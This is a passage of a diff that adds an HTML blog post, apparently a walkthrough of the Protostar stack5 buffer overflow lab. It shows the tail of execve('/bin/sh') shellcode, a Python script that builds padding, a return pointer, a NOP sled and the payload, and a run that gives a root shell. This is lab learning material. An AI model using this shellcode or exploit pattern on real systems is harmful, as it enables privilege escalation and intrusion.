class="si">\</span><span class="se">x12</span><span class="si">\</span><span class="se">x27</span><span class="si">\</span><span class="se">xb0</span><span class="si">\</span><span class="se">x05</span><span class="si">\</span><span class="se">xcd</span><span class="si">\</span><span class="se">x80</span><span class="si">\</span><span class="se">x6a</span><span class="si">\</span><span class="se">x17</span><span class="si">\</span><span class="se">x58</span><span class="si">\</span><span class="se">x31</span><span class="si">\</span><span class="se">xdb</span><span class="si">\</span><span class="se">xcd</span><span class="si">\</span><span class="se">x80</span><span class="si">\</span><span class="se">x6a</span><span class="si">\</span><span class="se">x2e</span><span class="si">\</span><span class="se">x58</span><span class="si">\</span><span class="se">x53</span><span class="si">\</span><span class="se">xcd</span><span class="si">\</span><span class="se">x80</span><span class="si">\</span><span class="se">x31</span><span class="si">\</span><span class="se">xc0</span><span class="si">\</span><span class="se">x50</span><span class="si">\</span><span class="se">x68</span><span class="s">//sh</span><span class="si">\</span><span class="se">x68</span><span class="s">/bin</span><span class="si">\</span><span class="se">x89</span><span class="si">\</span><span class="se">xe3</span><span class="si">\</span><span class="se">x50</span><span class="si">\</span><span class="se">x53</span><span class="si">\</span><span class="se">x89</span><span class="si">\</span><span class="se">xe1</span><span class="si">\</span><span class="se">x99</span><span class="si">\</span><span class="se">xb0</span><span class="si">\</span><span class="se">x0b</span><span class="si">\</span><span class="se">xcd</span><span class="si">\</span><span class="se">x80</span><span class="s">"</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">returnPointer</span> <span class="o">+</span> <span class="n">nop_sled</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><strong>Note:</strong> The return pointer can be any value that lands in the NOP sled.</p>
+
+<p>As a consequence a shell is popped back to us:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@protostar:~<span class="nv">$ </span><span class="o">(</span>python overflow_stack5_1.py<span class="p">;</span> <span class="nb">cat</span><span class="o">)</span> | /opt/protostar/bin/stack5
+<span class="c">#</span>
+<span class="c"># whoami</span>
+root
+</code></pre></div></div>
+<p><strong>Note</strong> <code class="highlighter-rouge">cat</code> was used to keep the stdin open and introduce commands that will be passed to the popped shell.</p>
+
+<p><strong>HAPPY HACKING :)</strong></p>
